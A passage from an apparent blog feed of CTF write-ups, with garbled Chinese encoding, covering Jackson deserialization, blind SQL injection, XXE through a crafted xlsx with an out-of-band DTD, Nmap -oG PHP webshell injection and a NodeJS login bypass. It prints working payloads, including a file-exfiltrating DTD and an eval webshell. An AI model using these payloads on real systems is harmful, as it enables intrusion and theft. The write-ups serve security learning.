<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;8323fe99-49b2-449a-bbc2-100e2be3ca87.node3.buuoj.cn&#x2F;;&#x2F;json</span><br></pre></td></tr></table></figure>

<p>è®¿é—®å¾—åˆ°å›æ˜¾ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="number">1619772401954</span>,</span><br><span class="line">    <span class="attr">&quot;status&quot;</span>: <span class="number">400</span>,</span><br><span class="line">    <span class="attr">&quot;error&quot;</span>: <span class="string">&quot;Bad Request&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;exception&quot;</span>: <span class="string">&quot;org.springframework.http.converter.HttpMessageNotReadableException&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;Required request body is missing: public java.lang.String com.ctf.controller.JsonController.json(java.lang.String) throws java.io.IOException&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;path&quot;</span>: <span class="string">&quot;/;/json&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®æ—¢ç„¶æç¤ºè®©æˆ‘ä»¬postä¸œè¥¿è¿‡å»ï¼Œæˆ‘ä»¬å°±å°è¯•ç€è¯•è¯•çœ‹ã€‚ã€‚</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="number">1619772427543</span>,</span><br><span class="line">    <span class="attr">&quot;status&quot;</span>: <span class="number">500</span>,</span><br><span class="line">    <span class="attr">&quot;error&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;exception&quot;</span>: <span class="string">&quot;com.fasterxml.jackson.databind.JsonMappingException&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;Unexpected token (END_ARRAY), expected VALUE_STRING: need JSON String that contains type id (for subtype of java.lang.Object)\n at [Source: []; line: 1, column: 2]&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;path&quot;</span>: <span class="string">&quot;/;/json&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç™¾åº¦çœ‹çœ‹jackson æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œæ‰¾åˆ°è¿™ç¯‡æ–‡ç« ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;182695</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;5792</span><br></pre></td></tr></table></figure>

<p>æ–‡ç« ä¸­æåˆ°jacksonåå°„åº“ä¼šç›´æ¥ååºåˆ—åŒ–æ‰æˆ‘ä»¬çš„è¾“å…¥..</p>
<p><img src="%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb/image-20210430170011644.png" alt="image-20210430170011644"></p>
<p>ä½†æ˜¯æ–‡ç« ä¸­ç»™å‡ºçš„æ“ä½œæ˜¯JDBCçš„ï¼Œ</p>
<p><strong><img src="%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb/image-20210430170220729.png" alt="image-20210430170220729"></strong></p>
<p>å†çœ‹çœ‹ç»™å‡ºçš„å‡ ä¸ªä¾‹å­ï¼ŒæŠ„è¿‡æ¥å‘ç°å¹¶æ²¡æœ‰å•¥ç”¨ã€</p>
<p><img src="%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb/image-20210430171525984.png" alt="image-20210430171525984"></p>
<p>æ„Ÿè§‰è‡ªå·±ä¸ä¼šçš„ä¸œè¥¿è¿˜æ˜¯å¤ªå¤šäº†ã€‚ã€‚ã€‚</p>
<p>æ¥ç€è®°å½•mysqlçš„è¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from websites where id&#x3D;1||if((ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)&#x3D;(database())),1,1)))&gt;100,1,0);</span><br></pre></td></tr></table></figure>

<p>è¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.96.91.106:5001&#x2F;?id&#x3D;%27||if((ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)&#x3D;(database())),1,1)))&gt;0,1,0)%23</span><br></pre></td></tr></table></figure>

<p>ä»¥åŠï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from websites where id&#x3D;1||if((ascii(substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name)in(database())),1,1)))&gt;131,1,0);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">||if((ascii(substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name)in(database())),1,1)))&gt;1,1,0)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘é¼æ¯fileJava</title>
    <url>/2020/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AFfileJava/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul>
<li>Java æ–‡ä»¶æ³„éœ²</li>
<li>XXE</li>
</ul>
<p>åšé¢˜æ€è·¯ï¼š</p>
<p>å¼€å±€å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œä¸‹è½½çš„æ—¶å€™å¯ä»¥æ–‡ä»¶æ³„éœ²</p>
<p><img src="image-20201217125640279.png" alt="image-20201217125640279"></p>
<p>è¿™æ ·çš„è¯å°±å¯ä»¥æ‰¾åˆ°ä¸‰ä¸ªJavaæ–‡ä»¶ï¼Œåˆ†åˆ«dumpæºç ï¼Œåœ¨æ–‡ä»¶ä¸­ä½œè€…ç»™å‡ºäº†æç¤º</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FileItem fileItem = (FileItem)var10.next();</span><br><span class="line">String filename;</span><br><span class="line">String fileExtName;</span><br><span class="line"><span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">    filename = fileItem.getFieldName();</span><br><span class="line">    fileExtName = fileItem.getString(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    filename = fileItem.getName();</span><br><span class="line">    <span class="keyword">if</span> (filename != <span class="keyword">null</span> &amp;&amp; !filename.trim().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        fileExtName = filename.substring(filename.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        InputStream in = fileItem.getInputStream();</span><br><span class="line">        <span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">                Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">                System.out.println(sheet.getFirstRowNum());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvalidFormatException var20) &#123;</span><br><span class="line">                System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">                var20.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>æ•…æ‰¾åˆ°è¿™ä¸ªCVEï¼š</p>
<p><a href="https://blog.csdn.net/weixin_42296449/article/details/88934150">https://blog.csdn.net/weixin_42296449/article/details/88934150</a></p>
<p>å…ˆå†™ä¸€ä¸ªç¬¦åˆæ­£åˆ™çš„çš„ç”¨æˆ·åevcel-xxx.xlsx,å°†å…¶åç¼€ä¿®æ”¹ä¸ºzipï¼ŒåŠ ä¸ŠPOCä¹‹åå†ä¿®æ”¹å›å»ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://0.0.0.0/1.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="image-20201217130933478.png" alt="image-20201217130933478"></p>
<p>åœ¨åå°„è¿‡å»çš„æœºå­ä¸Šé¢å†™ä¸€ä¸ª1.dtdï¼Œä»¤å…¶è¿œç¨‹å®ä½“è°ƒç”¨</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;0.0.0.0?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>éšåä¸Šä¼ æ–‡ä»¶å³å¯ï¼š</p>
<p><img src="image-20201217131243814.png" alt="image-20201217131243814"></p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>Java</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘é¼æ¯æœ±é›€ç»„Nmap</title>
    <url>/2020/12/16/%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84Nmap/</url>
    <content><![CDATA[<h1 id="è€ƒç‚¹ï¼š"><a href="#è€ƒç‚¹ï¼š" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h1><ul>
<li>NMAP ç»„ä»¶</li>
<li>PHP çŸ­æ ‡ç­¾ç»•è¿‡</li>
</ul>
<h1 id="åšé¢˜æ€è·¯"><a href="#åšé¢˜æ€è·¯" class="headerlink" title="åšé¢˜æ€è·¯"></a>åšé¢˜æ€è·¯</h1><p>é¢˜ç›®ç±»ä¼¼BUUæ›¾ç»çš„é¢˜ç›®Online Tool</p>
<p>æ­¤å¤„ä½¿ç”¨systemå‡½æ•°ï¼Œåº”è¯¥å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œnmapå‚æ•°ä¸­ -oGå¯ä»¥è¿›è¡Œæ–‡ä»¶å†™å…¥ï¼Œæ­¤å¤„æˆ‘ä»¬å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œæœ€åpayloadä¸º</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?host=&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å†™å…¥PHPè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ç»•è¿‡ä¸€ä¸‹å°±è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">host&#x3D; &#39; &lt;?&#x3D;&#96;$_POST[0]&#96; ;?&gt; -oG 1.phtml &#39;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>è™ç¬¦2021_InternalSystem</title>
    <url>/2021/04/05/%E8%99%8E%E7%AC%A62021-InternalSystem/</url>
    <content><![CDATA[<p>æ¯”èµ›çš„æ—¶å€™å®Œå…¨æ²¡æƒ³åˆ°å†…ç½‘é“¾æ¥..ç™»é™†ä¸Šå»ä¹‹åå°±å¡ä½äº†ï¼Œçœ‹äº†èµµæ€»çš„åšå®¢æ‰æ‡‚ï¼Œèµµæ€»tql!</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.zhaoj.in&#x2F;read-6905.html</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜ç›®æ¶‰åŠçš„è€ƒç‚¹å¦‚ä¸‹ï¼š</p>
<ul>
<li>NodeJS å¼±ç±»å‹æ¯”è¾ƒ</li>
<li>NodeJSä»£ç å®¡è®¡</li>
<li>SSRF</li>
<li>NodeJS8çš„æ¼æ´</li>
</ul>
<p>åœ¨/sourceä¸‹æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æºç ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> router = express.Router()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&#x27;axios&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isIp = <span class="built_in">require</span>(<span class="string">&#x27;is-ip&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> IP = <span class="built_in">require</span>(<span class="string">&#x27;ip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> UrlParse = <span class="built_in">require</span>(<span class="string">&#x27;url-parse&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;sha256, hint&#125; = <span class="built_in">require</span>(<span class="string">&#x27;./utils&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> salt = <span class="string">&#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> adminHash = sha256(sha256(salt + <span class="string">&#x27;admin&#x27;</span>) + sha256(salt + <span class="string">&#x27;admin&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = process.env.PORT || <span class="number">3000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatResopnse</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span>(response) !== <span class="keyword">typeof</span>(<span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(response)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SSRF_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> host = <span class="keyword">new</span> UrlParse(url).hostname.replace(<span class="regexp">/\[|\]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> isIp(host) &amp;&amp; IP.isPublic(host)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FLAG_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> pathname = <span class="keyword">new</span> UrlParse(url).pathname</span><br><span class="line">  <span class="keyword">return</span> !pathname.startsWith(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">OTHER_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF]</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">req.session.admin === <span class="literal">undefined</span> || req.session.admin === <span class="literal">null</span></span>)</span> &#123;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;username, password&#125; = req.query;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!username || !password || username === password || username.length === password.length || username === <span class="string">&#x27;admin&#x27;</span></span>)</span> &#123;</span><br><span class="line">    res.render(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> hash = sha256(sha256(salt + username) + sha256(salt + password))</span><br><span class="line"></span><br><span class="line">    req.session.admin = hash === adminHash</span><br><span class="line"></span><br><span class="line">    res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/index&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">req.session.admin === <span class="literal">undefined</span> || req.session.admin === <span class="literal">null</span></span>)</span> &#123;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.render(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">admin</span>: req.session.admin, <span class="attr">network</span>: <span class="built_in">JSON</span>.stringify(<span class="built_in">require</span>(<span class="string">&#x27;os&#x27;</span>).networkInterfaces())&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/proxy&#x27;</span>, <span class="keyword">async</span>(req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!req.session.admin</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="built_in">decodeURI</span>(req.query.url);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(url)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> status = WAF_LISTS.map(<span class="function">(<span class="params">waf</span>)=&gt;</span>waf(url)).reduce(<span class="function">(<span class="params">a,b</span>)=&gt;</span>a&amp;&amp;b)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!status</span>)</span> &#123;</span><br><span class="line">    res.render(<span class="string">&#x27;base&#x27;</span>, &#123;<span class="attr">title</span>: <span class="string">&#x27;WAF&#x27;</span>, <span class="attr">content</span>: <span class="string">&quot;Here is the waf...&quot;</span>&#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> response = <span class="keyword">await</span> axios.get(<span class="string">`http://127.0.0.1:<span class="subst">$&#123;port&#125;</span>/search?url=<span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">      res.render(<span class="string">&#x27;base&#x27;</span>, response.data)</span><br><span class="line">    &#125; <span class="function"><span class="title">catch</span>(<span class="params">error</span>)</span> &#123;</span><br><span class="line">      res.render(<span class="string">&#x27;base&#x27;</span>, error.message)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/proxy&#x27;</span>, <span class="keyword">async</span>(req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!req.session.admin</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// test url</span></span><br><span class="line">  <span class="comment">// not implemented here</span></span><br><span class="line">  <span class="keyword">const</span> url = <span class="string">&quot;https://postman-echo.com/post&quot;</span></span><br><span class="line">  <span class="keyword">await</span> axios.post(<span class="string">`http://127.0.0.1:<span class="subst">$&#123;port&#125;</span>/search?url=<span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">  res.render(<span class="string">&#x27;base&#x27;</span>, <span class="string">&quot;Something needs to be implemented&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.all(<span class="string">&#x27;/search&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip)</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;You can only use proxy to aceess here!&#x27;</span>&#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> result = &#123;<span class="attr">title</span>: <span class="string">&#x27;Search Success&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> method = req.method.toLowerCase()</span><br><span class="line">  <span class="keyword">const</span> url = <span class="built_in">decodeURI</span>(req.query.url)</span><br><span class="line">  <span class="keyword">const</span> data = req.body</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">method == <span class="string">&#x27;get&#x27;</span></span>)</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> response = <span class="keyword">await</span> axios.get(url)</span><br><span class="line">      result.content = formatResopnse(response.data)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="function"><span class="title">if</span>(<span class="params">method == <span class="string">&#x27;post&#x27;</span></span>)</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> response = <span class="keyword">await</span> axios.post(url, data)</span><br><span class="line">      result.content = formatResopnse(response.data)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result.title = <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">      result.content = <span class="string">&#x27;Unsupported Method&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="function"><span class="title">catch</span>(<span class="params">error</span>)</span> &#123;</span><br><span class="line">    result.title = <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    result.content = error.message</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.json(result)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">  res.sendFile( __dirname + <span class="string">&quot;/&quot;</span> + <span class="string">&quot;index.js&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip)</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;No Flag For You!&#x27;</span>&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.json(&#123;<span class="attr">hint</span>: hint&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router</span><br></pre></td></tr></table></figure>

<p>ç™»é™†éƒ¨åˆ†çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;username, password&#125; = req.query;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!username || !password || username === password || username.length === password.length || username === <span class="string">&#x27;admin&#x27;</span></span>)</span> &#123;</span><br><span class="line">    res.render(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> hash = sha256(sha256(salt + username) + sha256(salt + password))</span><br><span class="line"></span><br><span class="line">    req.session.admin = hash === adminHash</span><br><span class="line"></span><br><span class="line">    res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®è¦æ±‚å«æœ‰usernameå’Œpasswordå¼ºç­‰äºï¼ŒåŒæ—¶è¿˜è¦æ±‚å¼ºåº¦ä¸ç­‰ï¼Œæœ€åè¿˜ä¸å…è®¸usernameçš„åå­—ä¸æ˜¯adminã€‚</p>
<p>åˆšå¼€å§‹æˆ‘å°±å¡åœ¨è¿™é‡Œäº†ï¼Œåæ¥å­¦é•¿æ¨æµ‹å’ŒPHPçš„ç‰¹æ€§ä¸€æ ·ï¼Œè¯•äº†ä¸€ä¸‹æœç„¶passæ‰äº†..</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> username = [<span class="string">&#x27;admin&#x27;</span>]</span><br><span class="line"><span class="keyword">var</span> password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(username.length);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">if</span>(<span class="params">!username || !password || username === password || username.length === password.length || username === <span class="string">&#x27;admin&#x27;</span></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;false&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;yes&#x27;</span>);</span><br><span class="line">      </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//çœ‹æ¥å’ŒPHPçš„ç‰¹æ€§å·®ä¸å¤š..å‡†ç¡®æ¥è¯´è¿™å°±æ˜¯å¼±ç±»å‹è¯­è¨€çš„ç‰¹æ€§ï¼Œå½“ä¸¤è€…è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™å°±ä¼šè¿›è¡Œè½¬æ¢ï¼ŒåŒæ—¶å½“æˆ‘ä»¬çš„å°è¯•å°†æ•°ç»„å’Œå­—ç¬¦ä¸²ç»„åˆèµ·æ¥çš„æ—¶å€™JSåˆå¯ä»¥æ­£ç¡®çš„æ‹¼æ¥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> salt = <span class="string">&quot;nodejs8&quot;</span></span><br><span class="line"><span class="built_in">console</span>.log(username+salt);</span><br><span class="line"><span class="comment">//adminnodejs8</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>SSRF</tag>
        <tag>NodeJs</tag>
      </tags>
  </entry>
  <entry>
    <title>é™æ€ä»£ç†</title>
    <url>/2020/11/09/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>å¥½ä¹…æ²¡ç”¨äº†éƒ½æœ‰ç‚¹å¿˜äº†ï¼Œç°åœ¨æ¡èµ·æ¥å­¦ä¸€ä¸‹ï¼Œä¹‹åè¿˜æœ‰ç”¨</p>
<h1 id="é™æ€ä»£ç†"><a href="#é™æ€ä»£ç†" class="headerlink" title="é™æ€ä»£ç†"></a>é™æ€ä»£ç†</h1><h2 id="ç»“åˆå‡ºç§Ÿæˆ¿å­ç†è§£"><a href="#ç»“åˆå‡ºç§Ÿæˆ¿å­ç†è§£" class="headerlink" title="ç»“åˆå‡ºç§Ÿæˆ¿å­ç†è§£"></a>ç»“åˆå‡ºç§Ÿæˆ¿å­ç†è§£</h2><p><img src="%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/image-20201109214003006.png" alt="image-20201109214003006"></p>
<p>é€šè¿‡å›¾ç¤ºï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸ªä¾‹å­ï¼š</p>
<ul>
<li>å®¢æˆ·éœ€è¦ç§Ÿä¸€ä¸ªæˆ¿å­</li>
<li>æˆ¿ä¸œéœ€è¦ç§Ÿå‡ºæˆ¿å­</li>
</ul>
